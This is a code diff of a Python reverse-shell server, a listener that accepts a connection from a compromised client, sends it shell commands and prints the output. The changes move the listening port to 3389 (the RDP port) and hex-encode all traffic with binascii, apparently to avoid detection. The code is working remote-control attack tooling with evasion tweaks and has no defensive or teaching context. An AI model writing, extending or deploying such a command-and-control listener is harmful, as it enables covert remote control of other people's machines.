@@ -1,9 +1,8 @@
-# new draft for server python shell
-
 import socket
+import binascii
 
 SERVER_HOST = "FF.FF.FF.FF" #host ip
-SERVER_PORT = 1189
+SERVER_PORT = 3389
 BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
 # separator string for sending 2 messages in one go
 SEPARATOR = "<sep>"
@@ -17,7 +16,7 @@ print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
 client_socket, client_address = s.accept()
 print(f"{client_address[0]}:{client_address[1]} Connected!")
 # receiving the current working directory of the client
-cwd = client_socket.recv(BUFFER_SIZE).decode()
+cwd = binascii.unhexlify(client_socket.recv(BUFFER_SIZE)).decode()
 print("[+] Current working directory:", cwd)
 
 while True:
@@ -27,12 +26,12 @@ while True:
         # empty command
         continue
     # send the command to the client
-    client_socket.send(command.encode())
+    client_socket.send(binascii.hexlify(command.encode()))
     if command.lower() == "exit":
         # if the command is exit, just break out of the loop
         break
     # retrieve command results
-    output = client_socket.recv(BUFFER_SIZE).decode()
+    output = binascii.unhexlify(client_socket.recv(BUFFER_SIZE)).decode()
     # split command output and current directory
     results, cwd = output.split(SEPARATOR)
     # print output
